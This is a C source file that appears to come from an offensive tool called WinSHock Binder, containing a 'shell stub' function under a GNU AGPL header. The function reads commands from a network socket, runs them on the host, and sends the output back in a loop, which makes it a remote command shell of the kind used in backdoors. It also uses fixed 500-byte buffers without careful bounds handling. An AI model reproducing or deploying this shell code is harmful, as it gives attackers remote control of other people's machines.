// WinSHock Binder (WsBind) Shell Stub
// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

void wss_basic(SockData wsShellSock)
{
	int wsReadIn = 0;
	char *wsPrompt = calloc(strlen(WSS_BASIC_PROMPT) + 8, 1);
	char *wsInput = malloc(500), *wsReturn = malloc(500);
	sprintf(wsPrompt, WSS_BASIC_PROMPT, wsw_pid());
	while(1)
	{
		wsc_write(&wsShellSock, wsPrompt);
		wsReadIn = wsc_read(&wsShellSock, 500, wsInput);
		if(wsReadIn <= 0) break;
		if(wsu_index_of(WSS_BASIC_EXIT, wsInput) == 0) break;
		wsInput[wsReadIn - 1] = 0;
		wsp_execv(wsInput, &wsReturn, 1);
		wsc_write(&wsShellSock, wsReturn);
		wsc_write(&wsShellSock, WSB_NEWLINE);
		wsu_clear_buffer(&wsInput, 500);
	}
	free(wsPrompt);
	free(wsInput);
	free(wsReturn);
}